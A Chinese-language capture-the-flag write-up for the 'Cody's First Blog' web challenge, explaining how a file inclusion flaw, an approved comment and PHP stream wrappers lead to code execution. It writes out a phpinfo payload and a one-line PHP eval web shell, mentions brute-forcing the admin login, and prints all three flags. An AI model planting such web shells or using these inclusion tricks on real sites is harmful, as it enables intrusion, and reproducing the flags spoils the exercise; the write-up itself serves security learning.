# Cody's First Blog

运用到文件包含漏洞的使用，以及PHP伪协议的知识。

### Flag1

![](/media/1dsaf1231d.png)

提交评论得到第一个flag（这里提交的内容包含&lt;?php都会弹出flag）

![](/media/12sa124ar13r.png)

**Flag1：**

**^FLAG^70fb6cb5f09fce5fb32c79e83f932dd7325e72bca4a060cd2da8c632dd838a58$FLAG$**

响应包有提到评论需要审核

回到首页，查看源代码发现如下注释：

![](/media/12ewd12sad1.png)

&lt;a href="?page=admin.auth.inc"&gt;Admin login&lt;/a&gt;

跟过去

![](/media/qwdqw21edsag.png)

是一个管理员的登录入口，先把他丢到burpsuit里面爆破，然后继续寻找线索（爆破了一个小时什么也没有，应该是烟雾弹）

### Flag2

注意到：[http://35.196.135.216:5001/d48c38814d/?page=admin.auth.inc](http://35.196.135.216:5001/d48c38814d/?page=admin.auth.inc)

我们对page参数进行修改一下看看

![](/media/eghgjt65ufg.png)

显然这是一个文件包含了，那思路就逐渐清晰，先扫一波存在的文件\(分析结构应该为xx.inc.php文件，这里并不能跨目录包含，已经限制了文件包含的路径\)源代码已经强制在后面添加了.php后缀。（这里方便筛选，包含成功的不会出现字符串Warning，这一条件可以作为筛选项）

![](/media/fafher45uhgf.png)

得到的结果大概就这三个。

访问一下admin.inc这个页面

![](/media/gsdg43h46ghj.png)

页面最底下有一个flag

^FLAG^3b3811daa28ae899032343b43e155238cdf7ae8c921f78d0494813a3dcad0e5c$FLAG$

不仅如此，注意到上面有确认评论的选项，尝试确认一下评论。

![](/media/grege75kgkkgh.png)

回到主页我们惊喜的发现，评论插进了主页，这里就有一个骚思路了，那就是对index文件进行包含，从而达到插入的命令以PHP语句来执行。

![](/media/rthrtmhcvb567d3.png)

### Flag3

插入&lt;?php phpinfo\(\); ?&gt;，并且确认评论

![](/media/asd1das23t262.png)

虽然在页面上没有看到我们插入的内容，但是我们尝试用php伪协议

**PHP伪协议**

PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen\(\)、 copy\(\)、 file\_exists\(\) 和 filesize\(\) 的文件系统函数。 除了这些封装协议，还能通过 stream\_wrapper\_register\(\) 来注册自定义的封装协议。

[https://www.cnblogs.com/lgf01010/p/9595391.html](https://www.cnblogs.com/lgf01010/p/9595391.html)

**目录**

[![](/media/fasf1ff1fsg.jpg "目录")](http://image.3001.net/images/20180827/1535362079_5b83c41fbe910.png)

URL如下：

![](/media/fsdaf2fdsy32.png)

我们惊喜的发现，插入的PHP代码被解析并且执行了。

下面就是直接插入一句话

&lt;?php @eval\($\_POST\['cmd'\]\); ?&gt;

前往admin.inc确认评论

![](/media/3rfdsg3hgffh.png)

然后直接用菜刀连接

![](/media/asf1dsa112.png)

最后一个flag在index.php注释里面

![](/media/qwasf2t32dsf.png)

^FLAG^7c0e45cb6dbb53a134e5627e432a2a660192cdf3fe1dcf5e06b91886594e35e4$FLAG$

![](/media/asff1231hk76.png)

自此全部完成

